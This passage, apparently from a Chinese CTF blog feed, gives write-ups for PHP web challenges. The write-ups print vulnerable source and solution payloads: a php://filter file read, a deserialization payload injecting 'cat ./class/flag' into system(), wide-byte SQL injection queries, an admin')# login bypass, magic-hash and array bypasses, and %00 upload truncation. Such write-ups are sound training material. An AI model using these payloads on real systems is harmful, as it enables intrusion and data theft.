class="string">'file'</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>解法：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST /?flag=QNKCDZO&amp;daiker=s878926199a&amp;file=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=flag.php HTTP/1.1</span><br><span class="line">Host: 119.23.73.3:5101</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 112</span><br><span class="line">X-Forwarded-For: 127.0.0.1, 127.0.0.1</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">_GET[flag]=QNKCDZO&amp;_GET[daiker]=s878926199a&amp;_GET[file]=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure></p><h1 id="PUBG"><a href="#PUBG" class="headerlink" title="PUBG"></a>PUBG</h1><p>用工具扫一扫发现源码备份<br>index.php.bak<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    include <span class="string">'class.php'</span>;</span><br><span class="line">    <span class="keyword">if</span>(is_array(<span class="variable">$_GET</span>)&amp;&amp;count(<span class="variable">$_GET</span>)&gt;0)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">"LandIn"</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$pos</span>=<span class="variable">$_GET</span>[<span class="string">"LandIn"</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$pos</span>===<span class="string">"airport"</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            die(<span class="string">"&lt;center&gt;机场大仙太多,你被打死了~&lt;/center&gt;"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        elseif(<span class="variable">$pos</span>===<span class="string">"school"</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">echo</span>(<span class="string">'&lt;/br&gt;&lt;center&gt;&lt;a href="/index.html"  style="color:white"&gt;叫我校霸~~&lt;/a&gt;&lt;/center&gt;'</span>);</span><br><span class="line">            <span class="variable">$pubg</span>=<span class="variable">$_GET</span>[<span class="string">'pubg'</span>];</span><br><span class="line">            <span class="variable">$p</span> = unserialize(<span class="variable">$pubg</span>);</span><br><span class="line">            // <span class="variable">$p</span>-&gt;Get_air_drops(<span class="variable">$p</span>-&gt;weapon,<span class="variable">$p</span>-&gt;bag);</span><br><span class="line">        &#125;</span><br><span class="line">        elseif(<span class="variable">$pos</span>===<span class="string">"AFK"</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            die(<span class="string">"&lt;center&gt;由于你长时间没动,掉到海里淹死了~&lt;/center"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            die(<span class="string">"&lt;center&gt;You Lose&lt;/center&gt;"</span>);</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>class.php.bak<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    include <span class="string">'waf.php'</span>;</span><br><span class="line">    class sheldon&#123;</span><br><span class="line">        public <span class="variable">$bag</span>=<span class="string">"nothing"</span>;</span><br><span class="line">        public <span class="variable">$weapon</span>=<span class="string">"M24"</span>;</span><br><span class="line">        // public <span class="keyword">function</span> <span class="function"><span class="title">__toString</span></span>()&#123;</span><br><span class="line">        //     <span class="variable">$this</span>-&gt;str=<span class="string">"You got the airdrop"</span>;</span><br><span class="line">        //     <span class="built_in">return</span> <span class="variable">$this</span>-&gt;str;</span><br><span class="line">        // &#125;</span><br><span class="line">        public <span class="keyword">function</span> __wakeup()</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$this</span>-&gt;bag=<span class="string">"nothing"</span>;</span><br><span class="line">            <span class="variable">$this</span>-&gt;weapon=<span class="string">"kar98K"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        public <span class="keyword">function</span> Get_air_drops(<span class="variable">$b</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="variable">$this</span>-&gt;<span class="variable">$b</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        public <span class="keyword">function</span> __call(<span class="variable">$method</span>,<span class="variable">$parameters</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$file</span> = explode(<span class="string">"."</span>,<span class="variable">$method</span>);</span><br><span class="line">            <span class="built_in">echo</span> <span class="variable">$file</span>[0];</span><br><span class="line">            <span class="keyword">if</span>(file_exists(<span class="string">".//class<span class="variable">$file</span>[0].php"</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                system(<span class="string">"php  .//class//<span class="variable">$method</span>.php"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                system(<span class="string">"php  .//class//win.php"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">        public <span class="keyword">function</span> nothing()</span><br><span class="line">        &#123;</span><br><span class="line">            die(<span class="string">"&lt;center&gt;You lose&lt;/center&gt;"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        public <span class="keyword">function</span> __destruct()</span><br><span class="line">        &#123;</span><br><span class="line">            waf(<span class="variable">$this</span>-&gt;bag);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$this</span>-&gt;weapon===<span class="string">'AWM'</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$this</span>-&gt;Get_air_drops(<span class="variable">$this</span>-&gt;bag);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                die(<span class="string">'&lt;center&gt;The Air Drop is empty,you lose~&lt;/center&gt;'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p><a href="http://php.net/manual/zh/language.oop5.magic.php" target="_blank" rel="noopener">php的魔术方法</a><br><br><a href="https://zhuanlan.zhihu.com/p/33426188" target="_blank" rel="noopener">由Typecho 深入理解PHP反序列化漏洞</a><br><br><a href="http://blog.csdn.net/qq_19876131/article/details/52890854" target="_blank" rel="noopener">__wakeup()函数失效引发漏洞(CVE-2016-7124)</a><br><br>pyaload<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?LandIn=school&amp;pubg=O:7:<span class="string">"sheldon"</span>:3:&#123;s:3:<span class="string">"bag"</span>;s:24:<span class="string">"win.php;cat%20./class/flag"</span>;s:6:<span class="string">"weapon"</span>;s:3:<span class="string">"AWM"</span>;&#125;</span><br></pre></td></tr></table></figure></p><p>查看源代码即可得。</p><h1 id="简单的代码审计"><a href="#简单的代码审计" class="headerlink" title="简单的代码审计"></a>简单的代码审计</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include(<span class="string">'config.php'</span>);</span><br><span class="line">header(<span class="string">"Content-type:text/html;charset=utf-8"</span>);</span><br><span class="line"><span class="keyword">function</span> get_rand_code(<span class="variable">$l</span> = 6) &#123;</span><br><span class="line">    <span class="variable">$result</span> = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="variable">$l</span>--) &#123;</span><br><span class="line">        <span class="variable">$result</span> .= chr(rand(ord(<span class="string">'a'</span>), ord(<span class="string">'z'</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">test_rand_code</span></span>() &#123;</span><br><span class="line">    <span class="variable">$ip</span>=<span class="variable">$_SERVER</span>[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">    <span class="variable">$code</span>=get_rand_code();</span><br><span class="line">    <span class="variable">$socket</span> = @socket_create(AF_INET, SOCK_STREAM, SOL_TCP);</span><br><span class="line">    @socket_connect(<span class="variable">$socket</span>, <span class="variable">$ip</span>, 8888);</span><br><span class="line">    @socket_write(<span class="variable">$socket</span>, <span class="variable">$code</span>.PHP_EOL);</span><br><span class="line">    @socket_close(<span class="variable">$socket</span>);</span><br><span class="line">    die(<span class="string">'test ok!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> upload(<span class="variable">$filename</span>, <span class="variable">$content</span>,<span class="variable">$savepath</span>) &#123;</span><br><span class="line">    <span class="variable">$AllowedExt</span> = array(<span class="string">'bmp'</span>,<span class="string">'gif'</span>,<span class="string">'jpeg'</span>,<span class="string">'jpg'</span>,<span class="string">'png'</span>);</span><br><span class="line">    <span class="keyword">if</span>(!is_array(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">        <span class="variable">$filename</span> = explode(<span class="string">'.'</span>, <span class="variable">$filename</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!in_array(strtolower(<span class="variable">$filename</span>[count(<span class="variable">$filename</span>)-1]),<span class="variable">$AllowedExt</span>))&#123;</span><br><span class="line">        die(<span class="string">'error ext!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$code</span>=get_rand_code();</span><br><span class="line">    <span class="variable">$finalname</span>=<span class="variable">$filename</span>[0].<span class="string">'moctf'</span>.<span class="variable">$code</span>.<span class="string">"."</span>.end(<span class="variable">$filename</span>);</span><br><span class="line">    waf2(<span class="variable">$finalname</span>);</span><br><span class="line">    file_put_contents(<span class="string">"<span class="variable">$savepath</span>"</span>.<span class="variable">$finalname</span>, <span class="variable">$content</span>);</span><br><span class="line">    usleep(3000000);</span><br><span class="line">    file_put_contents(<span class="string">"<span class="variable">$savepath</span>"</span>.<span class="variable">$finalname</span>, <span class="string">"moctf"</span>);</span><br><span class="line">    unlink(<span class="string">"<span class="variable">$savepath</span>"</span>.<span class="variable">$finalname</span>);</span><br><span class="line">    die(<span class="string">'upload over!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$savepath</span>=<span class="string">"uploads/"</span>.sha1(<span class="variable">$_SERVER</span>[<span class="string">'REMOTE_ADDR'</span>]).<span class="string">"/"</span>;</span><br><span class="line"><span class="keyword">if</span>(!is_dir(<span class="variable">$savepath</span>))&#123;</span><br><span class="line">    <span class="variable">$oldmask</span> = <span class="built_in">umask</span>(0);</span><br><span class="line">    mkdir(<span class="variable">$savepath</span>, 0777);</span><br><span class="line">    <span class="built_in">umask</span>(<span class="variable">$oldmask</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">'action'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$act</span>=<span class="variable">$_GET</span>[<span class="string">'action'</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$act</span>===<span class="string">'upload'</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$filename</span>=<span class="variable">$_POST</span>[<span class="string">'filename'</span>];</span><br><span class="line">        <span class="keyword">if</span>(!is_array(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">            <span class="variable">$filename</span> = explode(<span class="string">'.'</span>, <span class="variable">$filename</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$content</span>=<span class="variable">$_POST</span>[<span class="string">'content'</span>];</span><br><span class="line">        waf(<span class="variable">$content</span>);</span><br><span class="line">        upload(<span class="variable">$filename</span>,<span class="variable">$content</span>,<span class="variable">$savepath</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$act</span>===<span class="string">'test'</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        test_rand_code();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="string">'index.php'</span>);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><a href="https://www.codemonster.cn/2018/02/13/2018-moctf-happy-writeup/" target="_blank" rel="noopener">官方的答案</a></p>]]></content>
      
      <categories>
          
          <category> ctf </category>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>南京邮电大学ctf的web题</title>
      <link href="/posts/dc43a318.html"/>
      <url>/posts/dc43a318.html</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>以前做过了，再做一下，大部分都是挺简单的。<br><a id="more"></a></p><h1 id="md5-collision"><a href="#md5-collision" class="headerlink" title="md5 collision"></a>md5 collision</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">md5(!1793422703!,32) = 0e332932043729729062996282883873</span><br><span class="line">md5(QNKCDZO,32) = 0e830400451993494058024219903391</span><br><span class="line">md5(240610708,32) = 0e462097431906509019562988736854</span><br></pre></td></tr></table></figure><p>上面三个加密后的MD5值是相等的，构造<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">？a=240610708</span><br></pre></td></tr></table></figure></p><h1 id="层层递进"><a href="#层层递进" class="headerlink" title="层层递进"></a>层层递进</h1><p>进入跳转的链接，fn+f12打开控制台，在网络项发现一个404页面，进入后，查看源码，仔细观察下面的js链接，flag.<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;!--  </span><br><span class="line">&lt;script src=<span class="string">"./js/jquery-n.7.2.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=<span class="string">"./js/jquery-c.7.2.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=<span class="string">"./js/jquery-t.7.2.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=<span class="string">"./js/jquery-f.7.2.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=<span class="string">"./js/jquery-&#123;.7.2.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=<span class="string">"./js/jquery-t.7.2.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=<span class="string">"./js/jquery-h.7.2.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=<span class="string">"./js/jquery-i.7.2.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=<span class="string">"./js/jquery-s.7.2.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=<span class="string">"./js/jquery-_.7.2.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=<span class="string">"./js/jquery-i.7.2.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=<span class="string">"./js/jquery-s.7.2.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=<span class="string">"./js/jquery-_.7.2.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=<span class="string">"./js/jquery-a.7.2.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=<span class="string">"./js/jquery-_.7.2.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=<span class="string">"./js/jquery-f.7.2.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=<span class="string">"./js/jquery-l.7.2.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=<span class="string">"./js/jquery-4.7.2.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=<span class="string">"./js/jquery-g.7.2.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=<span class="string">"./js/jquery-&#125;.7.2.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure></p><h1 id="AAencode"><a href="#AAencode" class="headerlink" title="AAencode"></a>AAencode</h1><p>一开始，一直在控制台上运行，一直未成功，仔细看一下，显示 ωﾟﾉ 为定义，定义：var ωﾟﾉ = “ “ 加上编码。</p><h1 id="你从哪里来"><a href="#你从哪里来" class="headerlink" title="你从哪里来"></a>你从哪里来</h1><p>按理说修改，<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Referer:http://www.google.com</span><br></pre></td></tr></table></figure></p><p>就行，可是一直不成功，作罢。</p><h1 id="Download"><a href="#Download" class="headerlink" title="Download~!"></a>Download~!</h1><p>两首歌，的下载地址都是<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">download.php?url=歌名.mp3的base64。</span><br></pre></td></tr></table></figure></p><p>猜测flag也是在要这样下载才能出来。不知道flag的文件名是什么。猜了很久没有成功。看别人的答案：才知道，首先下载文件名为download.php得到源码，发现有keyishere.php的文件，用两首歌下载链接的规律base64加密文件名，构造链接访问，即可得到flag。</p><h1 id="sql-injection-3"><a href="#sql-injection-3" class="headerlink" title="sql injection 3"></a>sql injection 3</h1><p>看链接地址，就猜测到时宽字节注入。这道题有两个flag，在ctf2表中的flag是错误的，ctf4表中的flag才是正确的。<br>得到字段数<br>一开始注释符号，直接用#，失败，页面一直报错，后来用%23，才行<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">id = %df<span class="string">' union select 1,database() %23</span></span><br><span class="line"><span class="string">``` </span></span><br><span class="line"><span class="string">猜解表名</span></span><br><span class="line"><span class="string">```bash</span></span><br><span class="line"><span class="string">id=%df'</span> union select 1,group_concat(table_name) from information_schema.tables <span class="built_in">where</span> table_schema=database() %23</span><br></pre></td></tr></table></figure></p><p>猜解字段名<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">id=%df<span class="string">' union select 1,group_concat(column_name) from information_schema.columns where table_name=0x63746632 %23</span></span><br></pre></td></tr></table></figure></p><p>得到记录值<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">id=%df<span class="string">' union select 1,group_concat(id,0x3a,flag) from ctf4 %23</span></span><br></pre></td></tr></table></figure></p><h1 id="x00"><a href="#x00" class="headerlink" title="/x00"></a>/x00</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">view-source:</span><br><span class="line">    <span class="keyword">if</span> (isset (<span class="variable">$_GET</span>[<span class="string">'nctf'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (@ereg (<span class="string">"^[1-9]+$"</span>, <span class="variable">$_GET</span>[<span class="string">'nctf'</span>]) === FALSE)</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">'必须输入数字才行'</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (strpos (<span class="variable">$_GET</span>[<span class="string">'nctf'</span>], <span class="string">'#biubiubiu'</span>) !== FALSE)   </span><br><span class="line">            die(<span class="string">'Flag: '</span>.<span class="variable">$flag</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">echo</span> <span class="string">'骚年，继续努力吧啊~'</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>构造<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?nctf[]</span><br></pre></td></tr></table></figure></p><p><a href="http://blog.csdn.net/sbhackerwing/article/details/63032439" target="_blank" rel="noopener">解法原理</a></p><h1 id="bypass-again"><a href="#bypass-again" class="headerlink" title="bypass again"></a>bypass again</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_GET</span>[<span class="string">'a'</span>]) and isset(<span class="variable">$_GET</span>[<span class="string">'b'</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">'a'</span>] != <span class="variable">$_GET</span>[<span class="string">'b'</span>])</span><br><span class="line"><span class="keyword">if</span> (md5(<span class="variable">$_GET</span>[<span class="string">'a'</span>]) == md5(<span class="variable">$_GET</span>[<span class="string">'b'</span>]))</span><br><span class="line">die(<span class="string">'Flag: '</span>.<span class="variable">$flag</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">'Wrong.'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>构造payload<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?a[]=1&amp;b[]=2</span><br></pre></td></tr></table></figure></p><p>或者<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?a=QNKCDZO&amp;b=240610708</span><br></pre></td></tr></table></figure></p><h1 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(<span class="string">"secret.php"</span>);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php <span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">"REQUEST_METHOD"</span>] == <span class="string">"POST"</span>) &#123; ?&gt;</span><br><span class="line">                        &lt;?php</span><br><span class="line">                        extract(<span class="variable">$_POST</span>);</span><br><span class="line">                        <span class="keyword">if</span> (<span class="variable">$pass</span> == <span class="variable">$thepassword_123</span>) &#123; ?&gt;</span><br><span class="line">                            &lt;div class=<span class="string">"alert alert-success"</span>&gt;</span><br><span class="line">                                &lt;code&gt;&lt;?php <span class="built_in">echo</span> <span class="variable">$theflag</span>; ?&gt;&lt;/code&gt;</span><br><span class="line">                            &lt;/div&gt;</span><br><span class="line">                        &lt;?php &#125; ?&gt;</span><br><span class="line">                    &lt;?php &#125; ?&gt;</span><br></pre></td></tr></table></figure><p>直接构造<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pass=1&amp;thepassword_123=1</span><br></pre></td></tr></table></figure></p><p>#php是世界上最好的语言 </p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span>(eregi(<span class="string">"hackerDJ"</span>,<span class="variable">$_GET</span>[id])) &#123;</span><br><span class="line">  <span class="built_in">echo</span>(<span class="string">"&lt;p&gt;not allowed!&lt;/p&gt;"</span>);</span><br><span class="line">  <span class="built_in">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_GET</span>[id] = urldecode(<span class="variable">$_GET</span>[id]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[id] == <span class="string">"hackerDJ"</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">echo</span> <span class="string">"&lt;p&gt;Access granted!&lt;/p&gt;"</span>;</span><br><span class="line">  <span class="built_in">echo</span> <span class="string">"&lt;p&gt;flag: *****************&#125; &lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>url编码，传输过去默认会解码一次，所以我们不能只加密一次,将hackerDJ进行url加密两次，构造<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">id=%25%36%38%25%36%31%25%36%33%25%36%42%25%36%35%25%37%32%25%34%34%25%34%41</span><br></pre></td></tr></table></figure></p><p><a href="http://blog.csdn.net/shaobingj126/article/details/6861646" target="_blank" rel="noopener">ereg和eregi</a></p><h1 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过"></a>上传绕过</h1><p>上传的位置为dir+文件名，在dir写xx.php%00(%00进行urldecode),文件名那里为.jpg符合的后缀名。即可绕过</p><h1 id="sql注入1"><a href="#sql注入1" class="headerlink" title="sql注入1"></a>sql注入1</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[user] &amp;&amp; <span class="variable">$_POST</span>[pass]) &#123;</span><br><span class="line">    mysql_connect(SAE_MYSQL_HOST_M . <span class="string">':'</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span><br><span class="line">  mysql_select_db(SAE_MYSQL_DB);</span><br><span class="line">  <span class="variable">$user</span> = trim(<span class="variable">$_POST</span>[user]);</span><br><span class="line">  <span class="variable">$pass</span> = md5(trim(<span class="variable">$_POST</span>[pass]));</span><br><span class="line">  <span class="variable">$sql</span>=<span class="string">"select user from ctf where (user='"</span>.<span class="variable">$user</span>.<span class="string">"') and (pw='"</span>.<span class="variable">$pass</span>.<span class="string">"')"</span>;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">'&lt;/br&gt;'</span>.<span class="variable">$sql</span>;</span><br><span class="line">  <span class="variable">$query</span> = mysql_fetch_array(mysql_query(<span class="variable">$sql</span>));</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$query</span>[user]==<span class="string">"admin"</span>) &#123;</span><br><span class="line">      <span class="built_in">echo</span> <span class="string">"&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$query</span>[user] != <span class="string">"admin"</span>) &#123;</span><br><span class="line">    <span class="built_in">echo</span>(<span class="string">"&lt;p&gt;You are not admin!&lt;/p&gt;"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$query</span>[user];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>由源码一直用户名填写 admin’)# 密码随便填，即可绕过</p><h1 id="pass-check"><a href="#pass-check" class="headerlink" title="pass check"></a>pass check</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$pass</span>=@<span class="variable">$_POST</span>[<span class="string">'pass'</span>];</span><br><span class="line"><span class="variable">$pass1</span>=***********;//被隐藏起来的密码</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$pass</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(@!strcmp(<span class="variable">$pass</span>,<span class="variable">$pass1</span>))&#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"flag:nctf&#123;*&#125;"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"the pass is wrong!"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"please input pass!"</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>构造post请求 pass[]</p><h1 id="起个名字真难"><a href="#起个名字真难" class="headerlink" title="起个名字真难"></a>起个名字真难</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> <span class="keyword">function</span> noother_says_correct(<span class="variable">$number</span>)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="variable">$one</span> = ord(<span class="string">'1'</span>);</span><br><span class="line">        <span class="variable">$nine</span> = ord(<span class="string">'9'</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = 0; <span class="variable">$i</span> &lt; strlen(<span class="variable">$number</span>); <span class="variable">$i</span>++)</span><br><span class="line">        &#123;   </span><br><span class="line">                <span class="variable">$digit</span> = ord(<span class="variable">$number</span>&#123;<span class="variable">$i</span>&#125;);</span><br><span class="line">                <span class="keyword">if</span> ( (<span class="variable">$digit</span> &gt;= <span class="variable">$one</span>) &amp;&amp; (<span class="variable">$digit</span> &lt;= <span class="variable">$nine</span>) )</span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">           <span class="built_in">return</span> <span class="variable">$number</span> == <span class="string">'54975581388'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$flag</span>=<span class="string">'*******'</span>;</span><br><span class="line"><span class="keyword">if</span>(noother_says_correct(<span class="variable">$_GET</span>[<span class="string">'key'</span>]))</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">'access denied'</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>因为key的值不能出现字母，但是又必须等于<code>54975581388</code>所以只能转换成其他进制，发现十六进制的，刚好都是字母<code>0xccccccccc</code>。所以<br>构造<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">key=0xccccccccc</span><br></pre></td></tr></table></figure></p><h1 id="重置密码"><a href="#重置密码" class="headerlink" title="重置密码"></a>重置密码</h1><p>进入链接后重置的是ctfuser的密码，发现url链接中user1=ctfuser的base64加密，直接点击重置试一下，显示错误。通过pb拦截数据包，将用户名改为admin,相关链接中的user1的值改为admin的base64加密的值。</p><h1 id="php反序列化"><a href="#php反序列化" class="headerlink" title="php反序列化"></a>php反序列化</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span 